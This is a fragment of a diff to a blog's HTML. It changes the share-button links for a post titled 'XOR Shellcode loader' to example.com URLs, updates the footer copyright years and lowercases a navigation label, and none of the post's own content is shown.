-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&name=XOR Shellcode loader&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/22/XOR-Shellcode-loader/&t=XOR Shellcode loader"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/22/XOR-Shellcode-loader/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&text=XOR Shellcode loader"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&is_video=false&description=XOR Shellcode loader"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XOR Shellcode loader&body=Check out this article: http://example.com/2025/05/22/XOR-Shellcode-loader/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&title=XOR Shellcode loader"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/22/XOR-Shellcode-loader/&name=XOR Shellcode loader&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/22/XOR-Shellcode-loader/&t=XOR Shellcode loader"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -314,7 +321,7 @@
     Copyright &copy;
     
     
-    2016-2025
+    2024-2027
     Panosoiko
   </div>
   <div class="footer-right">
@@ -329,7 +336,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
